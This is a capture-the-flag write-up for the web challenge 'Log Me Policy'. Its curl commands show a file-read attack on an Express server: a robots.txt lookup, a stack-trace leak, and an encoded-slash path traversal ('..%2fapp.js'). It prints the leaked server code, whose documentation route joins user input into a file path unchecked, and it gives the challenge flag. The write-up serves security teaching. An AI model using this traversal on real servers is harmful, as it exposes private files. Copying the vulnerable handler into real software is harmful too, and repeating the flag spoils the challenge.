# Log Me Policy
* Category: Web
* 200 Points
* Solved by the JCTF Team

## Description
> Hi there, our SOC team recived message that a hacker was quickly able to compromise our customer's senstive data by abuse our super-secure login page.
> 
> Could you spot the vulnerability and let us know the flag?


## Solution

We visit the attached website and get a simple login page (`https://logmepolicy.appsecil.ctf.today/relam/splogin`).

Apart from the login form, the login page contains a link to the terms of use:

```html
<div class="text-center">
    By login you are accept to our <a class="small" href="../documentation/terms.txt"
                                        download>terms of
        use</a> policy.
</div>
```

Let's take a look at `robots.txt`:

```
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/robots.txt
User-agent: *
Disallow: /
Disallow: /documentation/terms.txt
Disallow: /documentation/old_terms.txt
```

So both `terms` and `old_terms.txt` are hidden from search engines.

Let's check the terms:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/relam/../documentation/terms.txt
Website Terms of Use
Version 2.0

The Website Name website located at Website.com is a copyrighted work belonging to Website Name. Certain features of the Site may be subject to additional guidelines, terms, or rules, which will be posted on the Site in connection with such features.

All such additional terms, guidelines, and rules are incorporated by reference into these Terms.

These Terms of Use described the legally binding terms and conditions that oversee your use of the Site. BY LOGGING INTO THE SITE, YOU ARE BEING COMPLIANT THAT THESE TERMS and you represent that you have the authority and capacity to enter into these Terms. YOU SHOULD BE AT LEAST 18 YEARS OF AGE TO ACCESS THE SITE. IF YOU DISAGREE WITH ALL OF THE PROVISION OF THESE TERMS, DO NOT LOG INTO AND/OR USE THE SITE.

These terms require the use of arbitration Section 10.2 on an individual basis to resolve disputes and also limit the remedies available to you in the event of a dispute.
```

Nothing interesting there. Let's move one to the old terms:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/relam/../documentation/old_terms.txt
Error: ENOENT: no such file or directory, open '/app/documentation/old_terms.txt'
    at Object.openSync (fs.js:462:3)
    at Object.readFileSync (fs.js:364:35)
    at /app/app.js:40:21
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
    at param (/app/node_modules/express/lib/router/index.js:354:14)
    at param (/app/node_modules/express/lib/router/index.js:365:14)
```

We get an exception originating from `/app/app.js`.

Let's try to read it:

```
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/app.js
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /app.js</pre>
</body>
</html>
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/documentation/../app.js
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /app.js</pre>
</body>
</html>
```

No luck. Notice however that in both cases the error message refers to `/app.js`, without mentioning `/documentation/../app.js`. Let's take a closer look at the request being sent by `curl` by examining the request headers:
```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl -s -v -I https://logmepolicy.appsecil.ctf.today/documentation/../app.js 2>&1 | grep ">"
> HEAD /app.js HTTP/1.1
> Host: logmepolicy.appsecil.ctf.today
> User-Agent: curl/7.64.0
> Accept: */*
>
```

It looks like `curl` is requesting `/app.js` and not `/documentation/../app.js`. What if the file leak bug is only exposed when accessing paths under `/documentation/`?

To force `curl` to send the path as-is, we can use an extra flag:

> --path-as-is: Tell curl to not handle sequences of /../ or /./ in the given URL path. Normally curl will squash or merge them according to standards but with this option set you tell it not to do that. 

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl -s -v -I --path-as-is https://logmepolicy.appsecil.ctf.today/documentation/../app.js 2>&1 | grep ">"
> HEAD /documentation/../app.js HTTP/1.1
> Host: logmepolicy.appsecil.ctf.today
> User-Agent: curl/7.64.0
> Accept: */*
```

Now the full path that we've supplied is being sent, but we still don't get any useful response:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl --path-as-is https://logmepolicy.appsecil.ctf.today/documentation/../app.js
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /documentation/../app.js</pre>
</body>
</html>
```

Encoding the '`/`' as '`%2f`' does the trick:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/documentation/..%2fapp.js
const fs = require('fs');
const path = require('path');
const express = require("express");

const app = express();

// set the view engine to ejs
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    res.removeHeader("X-Powered-By");
    res.append('Server', 'AppSec-IL/20.20');
    res.append('Access-Control-Allow-Origin', ['*']);
    res.append('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.append('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

app.get("/", (req, res, next) => {
    res.redirect('/relam/splogin')
});

app.get("/relam/splogin", (req, res, next) => {
    res.render("login", {error: ""});
});

app.post("/relam/splogin", (req, res, next) => {
    res.render("login", {error: 'Username or password is incorrect.'});
});

/***
 * @TBD: our engineering team told us to check out this method, let's test it next sprint
 * AppSec-IL{d0_n0T_t4UST_uS34_iNp7t}
 */
app.get("/documentation/:file", (req, res, next) => {
    let buffer = "";
    const filePath = path.join(__dirname, "documentation", req.params.file);
    try {
        buffer = fs.readFileSync(filePath);
    } catch (error) {
        buffer = error.stack.toString();
    }
    res.type('application/octet-stream');
    res.send(buffer.toString());
});

app.listen(8081, () => {
    console.log("Server running on port 8081");
});
```

This confirms our suspicion that the path traversal bug exists only under `/documentation/`.

The flag: `AppSec-IL{d0_n0T_t4UST_uS34_iNp7t}`